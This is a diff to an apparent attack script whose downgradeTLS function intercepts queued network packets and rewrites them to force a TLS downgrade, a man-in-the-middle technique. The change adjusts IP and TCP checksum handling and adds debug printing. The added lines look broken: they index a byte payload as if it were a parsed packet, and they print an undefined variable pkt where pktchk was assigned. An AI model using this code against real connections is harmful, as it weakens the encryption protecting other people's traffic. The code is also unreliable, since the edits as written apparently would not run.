@@ -4,7 +4,7 @@
 # https://lbarman.ch/blog/downgrade-tls/
 #
 # Also, thanks to Mike D. for teaching me how to join() to fix
-# the bytes for packet.set_payload.
+# the bytes for set_payload().
 #
 # Also, @XargsNotBombs makes the wonderful Illustrated TLS Connections site.
 # https://tls.ulfheim.net
@@ -63,8 +63,20 @@ def downgradeTLS(packet):
 
         msg=b''.join(msgBytes2)
         packet.set_payload(msg)
+        
+        msg=packet.get_payload()
+        del msg["IP"].chksum
+        del msg["TCP"].chksum
+        packet.set_payload(msg)
+        
+        # Comparing to the original packet
+        pktchk = IP(packet.get_payload())
+        print("-----")
+        print(pkt.command()) 
+        print("-----")
+        print(pkt.show()) 
+        print("-----")
 
-        del packet.chksum
 
       packet.accept()                                                                     
     else:                                                                              
